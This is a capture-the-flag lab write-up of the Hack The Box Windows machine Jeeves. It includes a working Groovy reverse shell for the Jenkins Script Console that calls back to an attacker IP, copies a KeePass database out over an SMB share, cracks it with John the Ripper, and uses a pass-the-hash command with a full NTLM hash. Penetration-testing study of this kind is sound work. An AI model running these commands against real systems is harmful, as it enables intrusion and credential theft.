---
title: "HTB Jeeves"
date: 2026-05-11 11:31:00 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, Jenkins, KeePass]
image: /assets/img/posts/jeeves/jeeves.png
---

**HTB Jeeves** is a Windows machine that starts with web and SMB enumeration, revealing a `Jenkins instance` on port 50000. After abusing Jenkins `Script Console` to get a shell, I found a `KeePass database` on the system, extracted and cracked its password, and recovered the Administrator NTLM hash from the database. With that hash, I used `pass-the-hash` to gain Administrator access, then pulled the final flag from an `alternate data stream` on the Administrator desktop.
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.228.112 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```
- NSE Scripts & Version
```
nmap 10.129.228.112 -sCV -p80,135,445,50000 -nv --min-rate 1000
```
```
PORT      STATE SERVICE      VERSION                                                                                                                         
80/tcp    open  http         Microsoft IIS httpd 10.0                                                                                                        
| http-methods:                                                                                                                                              
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                           
|_  Potentially risky methods: TRACE                                                                                                                         
|_http-title: Ask Jeeves                                                                                                                                    
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2026-05-11T15:41:38
|_  start_date: 2026-05-11T15:27:05
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
```
- Jetty `9.4.z-SNAPSHOT`
### Directory enumeration
- port `80`
```
gobuster dir -u http://10.129.228.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
- port `50000`
```
gobuster dir -u http://10.129.228.112:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
...
askjeeves            (Status: 302) [Size: 0] [--> http://10.129.228.112:50000/askjeeves/]
```
- `/askjeeves`
## Jenkins
- Jenkins `ver. 2.87`
### Script Console
![Script Console](/assets/img/posts/jeeves/jscript.png)
[revshell-gen](https://www.revshells.com/)
- Listener
```
rlwrap -cAr nc -lvnp 4448
```
- Groovy script
```groovy
String host="10.10.14.141";
int port=4448;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Shell
![Whoami](/assets/img/posts/jeeves/whoami.png)
### File Transfer
- Server
```
sudo impacket-smbserver share . -smb2support
```
- Client
```
net use s: \\10.10.14.141\share
copy CEH.kdbx s:
```
- File
```
file CEH.kdbx 
CEH.kdbx: Keepass password database 2.x KDBX
```
### John the Ripper
```
keepass2john CEH.kdbx > kdbx_hash
```
```
john kdbx_hash --wordlist=/usr/share/wordlists/rockyou.txt
```
```
moonshine1       (CEH)
```
### Keepassxc
```
sudo apt-get install keepassxc
keepassxc CEH.kdbx
```
![Keepass](/assets/img/posts/jeeves/keep.png)
### Pass The Hash (PtH)
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.129.228.112 cmd.exe
```
- root.txt
```
dir /r
more < hm.txt:root.txt:$DATA
```